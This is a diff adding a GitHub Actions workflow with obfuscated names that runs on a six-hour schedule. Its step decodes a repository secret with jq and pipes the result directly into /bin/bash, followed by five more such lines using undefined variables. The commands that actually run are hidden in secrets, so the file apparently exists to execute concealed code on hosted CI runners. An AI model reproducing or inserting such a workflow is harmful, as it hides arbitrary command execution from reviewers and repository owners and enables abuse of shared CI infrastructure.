@@ -1,0 +1,23 @@
+name: hkkunshangj
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hkkunshangj
+        env:
+          gktu01: ${{ secrets.gktu01 }}
+        run: |
+          echo $gktu01 | jq -r .ci450 | /bin/bash
+          echo $gkcx64 | jq -r .xvsr939 | /bin/bash
+          echo $p35 | jq -r .rcuum8116 | /bin/bash
+          echo $yco526 | jq -r .w8 | /bin/bash
+          echo $ulzi97655 | jq -r .ql71376 | /bin/bash
+          echo $lzk0306 | jq -r .qbdmv79448 | /bin/bash
+
